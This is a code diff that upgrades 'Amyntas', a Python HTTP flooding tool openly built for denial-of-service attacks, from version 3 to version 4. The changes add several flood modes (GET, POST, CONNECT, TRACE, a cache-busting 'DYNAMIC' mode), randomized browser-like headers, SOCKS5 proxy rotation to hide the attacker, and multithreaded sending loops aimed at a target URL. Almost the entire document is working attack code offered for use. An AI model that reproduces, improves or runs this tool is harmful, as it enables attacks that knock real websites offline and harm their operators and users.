@@ -19,7 +19,7 @@ desc = f'{w}Thanks for using Amyntas v3! Use a proxy to be safe, unless you want
 # Arguments
 parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://target.domain', description=desc, allow_abbrev=False)
 parser.add_argument('-t',  '--target',       dest = 'target',       default = 'https://target.com',   help='Target URL (Example: https://google.com or http://fishysite.com)', type=str)
-parser.add_argument('-m',  '--mode',         dest = 'attack_mode',  default = 'GET',                  help='Attack mode (GET / HEAD / POST)', type=str)
+parser.add_argument('-m',  '--mode',         dest = 'attack_mode',  default = 'FAST',                 help='Attack mode (FAST / GET / HEAD / POST / CONNECT / TRACE / DYNAMIC)', type=str)
 parser.add_argument('-v',  '--verbose',      dest = 'verbose',      default = False,                  help='Show info when attacking', type=bool)
 parser.add_argument('-d',  '--duration',     dest = 'duration',     default = 80,                     help='Attack duration', type=int)
 parser.add_argument('-p',  '--proxy',        dest = 'proxy',        default = '',                     help='Use a proxy when attacking, only supports SOCKS5 (Example: 127.0.0.1:1337)', type=str)
@@ -38,7 +38,7 @@ banner = f'''{r}
    d88P  888 888 "888 "88b 888  888 888 "88b 888        "88b 88K      
   d88P   888 888  888  888 888  888 888  888 888    .d888888 "Y8888b. 
  d8888888888 888  888  888 Y88b 888 888  888 Y88b.  888  888      X88 
-d88P     888 888  888  888  "Y88888 888  888  "Y888 "Y888888  88888P' v3 :)
+d88P     888 888  888  888  "Y88888 888  888  "Y888 "Y888888  88888P' v4 :)
                                 888                                   
                            Y8b d88P                                   
                             "Y88P"
@@ -61,22 +61,52 @@ useragents     = ['Amnytas3.0 (Greetz to APTw3)']
 referers       = ['https://fbi.gov/c99.php?shell=']
 proxy_list     = []
 content_types  = ['multipart/form-data', 'application/x-url-encoded'] # for later usage
-accept_charset = ['UTF-8', 'UTF-16', 'ISO-8859-1', 'ISO-8859-15', 'ISO-8859-2', 'Windows-1251'] # for later usage
 
-def load_proxylist():
-    with open(args.proxylist, 'r') as proxies:
-        for proxy in proxies.readlines():
-            proxy_list.append(proxy.strip())
+accept_charset = [
+    'UTF-8', 
+    'UTF-16', 
+    'ISO-8859-1', 
+    'ISO-8859-15', 
+    'ISO-8859-2', 
+    'Windows-1251'
+]
 
-def load_useragents():
-    with open(args.ualist, 'r') as uas:
-        for ua in uas.readlines():
-            useragents.append(ua.strip())
+accepts        = [
+    'text/html,application/xhtml+xml,application/xml,q=0.9,image/webp,image/apng,*/*;q=0.8',
+    '*/*',
+    'application/json',
+    'text/html,application/xhtml+xml,image/jxr,*/*',
+    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1'
+]
 
-def load_referrers():
-    with open(args.reflist, 'r') as refs:
-        for ref in refs.readlines():
-            referers.append(ref.strip())
+encodings      = [
+    'deflate', 
+    'gzip', 
+    'compress',
+    'br', 
+    'identity', 
+    '*', 
+    'gzip, deflate, br', 
+    'gzip, br', 
+    'identity, compress', 
+    'br;q=1.0, gzip;q=0.8, *;q=0.1'
+]
+
+class Load:
+    def proxylist():
+        with open(args.proxylist, 'r') as proxies:
+            for proxy in proxies.readlines():
+                proxy_list.append(proxy.strip())
+
+    def useragents():
+        with open(args.ualist, 'r') as uas:
+            for ua in uas.readlines():
+                useragents.append(ua.strip())
+
+    def referrers():
+        with open(args.reflist, 'r') as refs:
+            for ref in refs.readlines():
+                referers.append(ref.strip())
 
 def randomstr(min, max):
     range_ = randint(min, max)
@@ -91,87 +121,118 @@ def postdata():
     return choice(post_datas)
 
 # Attack script
-def attack(threadcount):
-    try:
-        sock = socks.socksocket()
-        sock.settimeout(3)
-        if args.proxy:
-            ip, port = args.proxy.split(':')
-            if args.verbose:
-                print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Proxy set to {args.proxy}')
+class DDoS:
+    def attack(threadcount):
+        try:
+            sock = socks.socksocket()
+            sock.settimeout(3)
 
-            sock.set_proxy(socks.SOCKS5, str(ip), int(port))
-        elif args.rotate_proxy:
-            if len(proxy_list) < 0:
-                sys.exit("Proxy list is empty!")
+            if args.proxy:
+                ip, port = args.proxy.split(':')
+                if args.verbose:
+                    print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Proxy set to {args.proxy}')
+
+                sock.set_proxy(socks.SOCKS5, str(ip), int(port))
+
+            elif args.rotate_proxy:
+                if len(proxy_list) < 0:
+                    sys.exit("Proxy list is empty!")
+                
+                ip, port = choice(proxy_list).split(':') # each thread gets a proxy, if the proxy fails the thread ends
+                if args.verbose:
+                    print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Rotating proxies enabled, setting proxy to {ip}:{port}')
+
+                sock.set_proxy(socks.SOCKS5, str(ip), int(port))
+
+            url = args.target
+            connect_port = None
+            if url.startswith('http://'): # If its HTTP
+                connect_port = 80
+                host = url.replace('http://', '')
+                target = socket.gethostbyname(host)
+                sock.connect((target, 80))
+
+            elif url.startswith('https://'): # If its HTTPS
+                connect_port = 443
+                host = url.replace('https://', '')
+                target = socket.gethostbyname(host)
+
+                sock.connect((target, 443))
+                sock = ssl.wrap_socket(sock)
+
+            else:
+                print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] {url} is not a valid url!')
+                sys.exit()
             
-            ip, port = choice(proxy_list).split(':') # each thread gets a proxy, if the proxy fails the thread ends
+            stop = time.time() + args.duration # Get the time
+
+            if args.attack_mode == 'FAST':
+                while time.time() < stop:
+                    sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'.encode() )
+
+            elif args.attack_mode == 'GET':
+                while time.time() < stop:
+                    sock.send( f'GET /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n\r\n'.encode() )
+            
+            elif args.attack_mode == 'HEAD':
+                while time.time() < stop:
+                    sock.send( f'HEAD /{randomstr(1, 20)} HTTP/1.1\r\nConnection: close\r\n'.encode() )
+
+            elif args.attack_mode == 'POST':
+                while time.time() < stop:
+                    sock.send( f'POST /{randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nDnt: 1\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\n{postdata()}'.encode() )
+                
+            elif args.attack_mode == 'CONNECT':
+                while time.time() < stop:
+                    sock.send( f'CONNECT {host}:{connect_port} HTTP/1.1\r\n'.encode() )
+            
+            elif args.attack_mode == 'TRACE':
+                while time.time() < stop:
+                    sock.send( f'TRACE /{randomstr(1, 20)} HTTP/1.1'.encode() )
+            
+            elif args.attack_mode == 'DYNAMIC':
+                while time.time() < stop:
+                    sock.send( f'GET /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n\r\n'.encode() )
+                    sock.send( f'POST /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n{postdata()}'.encode() )
+            
+            else:
+                print(f'{r}[{rr}!{r}]{rr} Attack method {r}[{rr}{args.attack_mode}{r}]{rr} not recognized')
+                sys.exit()
+
+            try: sock.shutdown(socket.SHUT_RDWR) # shutdown gracefully
+            except: sock.close()
+
             if args.verbose:
-                print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] Rotating proxies enabled, setting proxy to {ip}:{port}')
+                print(f'{r}[{rr}!{r}]{rr} Socket shut down.')
 
-            sock.set_proxy(socks.SOCKS5, str(ip), int(port))
-
-        url = args.target
-        if url.startswith('http://'): # If its HTTP
-            host = url.replace('http://', '')
-            target = socket.gethostbyname(host)
-            sock.connect((target, 80))
-
-        elif url.startswith('https://'): # If its HTTPS
-            host = url.replace('https://', '')
-            target = socket.gethostbyname(host)
-
-            sock.connect((target, 443))
-            sock = ssl.wrap_socket(sock)
-
-        else:
-            print(f'{r}[{rr}!{r}]{rr} [THREAD {threadcount}] {url} is not a valid url!')
+        except KeyboardInterrupt:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} CTRL-C pressed, lets exit!')
             sys.exit()
+
+        except socket.timeout:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} Server timed out!')
+            pass
+
+        # Connection errors
+        except ConnectionResetError:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} Connection Reset!')
+        except ConnectionRefusedError:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} Connection Refused!')
+        except ConnectionAbortedError:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} Connection Aborted! Check if any anti-virus or firewalls may be interrupting.')
         
-        pkt = None
-        if args.attack_mode == 'GET':
-            pkt = f'GET /{randomstr(1, 20)}?{randomstr(1, 20)}={randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() # Cache bypass ayee
-        
-        elif args.attack_mode == 'HEAD':
-            pkt = f'HEAD / HTTP/1.1\r\nConnection: close\r\n'.encode()
-
-        elif args.attack_mode == 'POST':
-            pkt = f'POST /{randomstr(1, 20)}?{randomstr(1, 20)}={randomstr(1, 20)} HTTP/1.1\r\nHost: {host}\r\n{postdata()}'.encode()
-
-        stop = time.time() + args.duration # Get the time
-        while time.time() < stop:
-            sock.send(pkt)
-
-        sock.shutdown(socket.SHUT_RDWR) # shut down gracefully
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} Socket shut down.')
-        sys.exit() # close thread
-    except KeyboardInterrupt:
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} CTRL-C pressed, lets exit!')
-        sys.exit()
-    except socket.timeout:
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} Server timed out!')
-        pass
-
-    # Connection errors
-    except ConnectionResetError:
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} Connection Reset!')
-        sys.exit()
-    except ConnectionRefusedError:
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} Connection Refused!')
-        sys.exit()
-    except ConnectionAbortedError:
-        if args.verbose:
-            print(f'{r}[{rr}!{r}]{rr} Connection Aborted! Check if any anti-virus or firewalls may be interrupting.')
-        sys.exit()
+        except ssl.SSLWantReadError:
+            if args.verbose:
+                print(f'{r}[{rr}!{r}]{rr} SSL reading error, server might be down or busy.')
 
 # Print the usage
 def usage():
-    print(f'{r}[{w}#{r}] {y}{"-"*12}{w}Amyntas 3 Usage{y}{"-"*12} {r}[{w}#{r}]{rr}')
+    print(f'{r}[{w}#{r}] {y}{"-"*12}{w}Amyntas 4 Usage{y}{"-"*12} {r}[{w}#{r}]{rr}')
     print(f'   python {sys.argv[0]} -t http://target.domain')
     print(f'    type python {sys.argv[0]} -h for more info')
     print(f'{r}[{w}#{r}] {y}--------------------------------------- {r}[{w}#{r}]{rr}')
@@ -183,19 +244,20 @@ def main():
 
     if len(sys.argv) < 2:
         usage()
+
     else:
         try:
             if args.proxylist:
-                load_proxylist()
+                Load.proxylist()
                 print(f'{r}[ {w}Loaded {len(proxy_list)} proxies from ({args.proxylist}) {r}]{rr}')
             
             if args.ualist:
-                load_useragents()
+                Load.useragents()
                 print(f'{r}[ {w}Loaded {len(useragents)} useragents from ({args.ualist}) {r}]{rr}')
             
             if args.reflist:
                 print(f'{r}[ {w}Loaded {len(referers)} referers from ({args.reflist}) {r}]{rr}')
-                load_referrers()
+                Load.referrers()
 
 
             print(banner)
@@ -206,7 +268,7 @@ def main():
                 threads = []
 
                 for x in range(args.workers):
-                    kaboom = threading.Thread(target=attack, args=(x,), daemon=True)#.start()
+                    kaboom = threading.Thread(target=DDoS.attack, args=(x,), daemon=True)#.start()
                     threads.append(kaboom)
 
                 print(f'Threads built. Ready to fire.')
